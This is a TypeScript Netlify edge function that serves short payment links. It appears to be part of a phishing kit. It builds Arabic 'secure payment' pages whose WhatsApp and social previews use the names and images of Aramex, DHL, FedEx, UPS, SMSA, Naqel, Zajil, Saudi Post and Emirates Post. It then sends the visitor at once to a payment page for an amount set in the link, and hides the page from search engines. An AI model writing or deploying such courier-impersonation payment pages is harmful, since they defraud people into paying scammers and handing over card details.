import { Context } from "https://edge.netlify.com";

const companyMeta: Record<string, { title: string; description: string; image: string }> = {
  aramex: {
    title: "دفع آمن - أرامكس للشحن السريع 🚚",
    description: "خدمات شحن عالمية مع أرامكس - أكمل عملية الدفع بأمان تام للحصول على خدمات شحن سريعة وموثوقة في جميع أنحاء الخليج والعالم ✅",
    image: "/og-aramex.jpg"
  },
  dhl: {
    title: "دفع آمن - DHL الشحن العالمي السريع ⚡",
    description: "DHL - الشبكة العالمية الأكبر للشحن السريع - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة وموثوقة إلى أي مكان في العالم 🌍",
    image: "/og-dhl.jpg"
  },
  fedex: {
    title: "دفع آمن - FedEx الشحن الدولي الموثوق 📦",
    description: "FedEx - رائدة الشحن الدولي - ادفع بأمان واحصل على خدمات شحن موثوقة مع تتبع فوري وضمان الوصول في الموعد المحدد ⏰",
    image: "/og-fedex.jpg"
  },
  ups: {
    title: "دفع آمن - UPS للشحن والتوصيل العالمي 🌐",
    description: "UPS - حلول لوجستية متكاملة - أكمل الدفع بأمان للحصول على خدمات شحن عالمية احترافية مع تغطية شاملة وتتبع دقيق 📍",
    image: "/og-ups.jpg"
  },
  smsa: {
    title: "دفع آمن - SMSA Express سمسا إكسبرس 🚛",
    description: "SMSA Express - الرائدة في الشحن السعودي - أكمل الدفع بأمان للحصول على خدمات توصيل سريعة في جميع أنحاء المملكة 🇸🇦",
    image: "/og-smsa.jpg"
  },
  naqel: {
    title: "دفع آمن - ناقل إكسبريس للشحن 🚚",
    description: "ناقل إكسبريس - خدمات شحن متطورة - أكمل دفعتك بأمان للحصول على توصيل سريع وآمن لجميع مدن ومناطق المملكة ⚡",
    image: "/og-naqel.jpg"
  },
  zajil: {
    title: "دفع آمن - زاجل للشحن السريع 📮",
    description: "زاجل - شحن سريع وموثوق في السعودية - ادفع بأمان واحصل على خدمات توصيل احترافية مع تغطية شاملة لكل المناطق 🇸🇦",
    image: "/og-zajil.jpg"
  },
  saudipost: {
    title: "دفع آمن - البريد السعودي 🇸🇦",
    description: "البريد السعودي الرسمي - خدمات بريدية وشحن موثوقة - ادفع بأمان واستفد من شبكة التوزيع الأوسع في المملكة 📦",
    image: "/og-saudipost.jpg"
  },
  empost: {
    title: "دفع آمن - البريد الإماراتي 🇦🇪",
    description: "البريد الإماراتي الرسمي - خدمات بريدية وشحن متميزة - ادفع بأمان واستمتع بخدمات الشحن المحلية والدولية الموثوقة ✨",
    image: "/og-empost.jpg"
  },
  default: {
    title: "منصة الدفع الذكية - خدمات دفع آمنة لدول الخليج 💳",
    description: "منصة متكاملة لخدمات الدفع الإلكتروني في دول الخليج - شحن، فواتير، عقود، خدمات حكومية وصحية بأمان وسهولة تامة",
    image: "/og-aramex.jpg"
  }
};

export default async (request: Request, context: Context) => {
  const url = new URL(request.url);
  
  // Check if this is a short link path like /p/ABC123
  const shortLinkMatch = url.pathname.match(/^\/p\/([a-zA-Z0-9]+)$/);
  
  if (shortLinkMatch) {
    const shortCode = shortLinkMatch[1];
    
    // Get company from URL params (support both c and company)
    const companyParam = url.searchParams.get("c") || url.searchParams.get("company") || "aramex";
    const meta = companyMeta[companyParam.toLowerCase()] || companyMeta.default;
    
    const siteUrl = url.origin;
    const fullImageUrl = `${siteUrl}${meta.image}`;
    const fullUrl = url.href;
    
    console.log(`[Short Link Meta] Code: ${shortCode}, Company: ${companyParam}`);
    console.log(`[Short Link Meta] Image: ${fullImageUrl}`);
    
    // Build HTML response with proper meta tags for crawlers
    const html = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <!-- Primary Meta Tags -->
  <title>${meta.title}</title>
  <meta name="description" content="${meta.description}"/>
  
  <!-- Open Graph / Facebook / WhatsApp -->
  <meta property="og:type" content="website"/>
  <meta property="og:title" content="${meta.title}"/>
  <meta property="og:description" content="${meta.description}"/>
  <meta property="og:image" content="${fullImageUrl}"/>
  <meta property="og:image:secure_url" content="${fullImageUrl}"/>
  <meta property="og:image:width" content="1200"/>
  <meta property="og:image:height" content="630"/>
  <meta property="og:image:type" content="image/jpeg"/>
  <meta property="og:url" content="${fullUrl}"/>
  <meta property="og:site_name" content="منصة الدفع الآمن"/>
  
  <!-- Twitter -->
  <meta name="twitter:card" content="summary_large_image"/>
  <meta name="twitter:title" content="${meta.title}"/>
  <meta name="twitter:description" content="${meta.description}"/>
  <meta name="twitter:image" content="${fullImageUrl}"/>
  
  <!-- Redirect script -->
  <script>
    // Get full params
    const params = new URLSearchParams(window.location.search);
    const company = params.get('c') || params.get('company') || 'aramex';
    const currency = params.get('cur') || params.get('currency') || 'SAR';
    const amount = params.get('a') || params.get('amount') || '500';
    const title = params.get('t') || params.get('title') || 'Payment';
    
    // Build redirect URL
    const redirectUrl = window.location.origin + '/pay/${shortCode}/recipient?company=' + company + '&currency=' + currency + '&amount=' + amount + '&title=' + encodeURIComponent(title);
    
    // Redirect immediately
    window.location.replace(redirectUrl);
  </script>
</head>
<body>
  <div style="display: flex; align-items: center; justify-content: center; min-height: 100vh; font-family: sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);">
    <div style="text-align: center; color: white;">
      <h1>جاري التحميل...</h1>
      <p>Please wait...</p>
    </div>
  </div>
</body>
</html>`;

    return new Response(html, {
      status: 200,
      headers: {
        "content-type": "text/html; charset=utf-8",
        "cache-control": "no-cache, no-store, must-revalidate",
        "x-robots-tag": "noindex",
      },
    });
  }
  
  return await context.next();
};

export const config = {
  path: ["/p/*"],
};
